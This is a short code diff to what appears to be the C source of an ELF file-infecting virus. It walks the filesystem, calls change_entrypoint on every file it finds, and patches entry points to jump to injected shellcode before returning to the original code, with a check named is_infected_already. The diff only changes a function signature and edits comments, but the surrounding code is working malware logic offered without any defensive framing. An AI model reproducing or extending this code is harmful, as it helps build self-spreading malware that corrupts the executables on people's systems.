@@ -59,7 +59,9 @@ int activate(){
     return 1; // 
 }
 
-void change_entrypoint(const char* fpath, char *newaddr){
+
+
+void change_entrypoint(const char* fpath){
 	int fd, i, shellcodeloc;
 	int is_infected_already = 1;  
 	char jmp2original[15];
@@ -161,7 +163,7 @@ void change_entrypoint(const char* fpath, char *newaddr){
 	
 	/*
 	  We use $RDI register to get relocation information. 
-	  $RDI holds address holds start VA offset info!
+	  $RDI holds base VA offset info!
 	  
 	  ex)
 	  
@@ -171,7 +173,6 @@ void change_entrypoint(const char* fpath, char *newaddr){
 	  - If not :  
 	  *RDI  0x7ffff7ffe168 <— 0x0
 	*/
-	
 	
 	/* 48 b8 41 41 41 41 41 41 41 41	movabs rax,0x4141414141414141 */
 	jmp2original[0] = 0x48;
@@ -202,7 +203,7 @@ void change_entrypoint(const char* fpath, char *newaddr){
 int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
     int ret = 0;
     if (flag == FTW_F && activate()) 
-		change_entrypoint(fpath, "0x11111111");
+		change_entrypoint(fpath);
         
     return ret;
 }
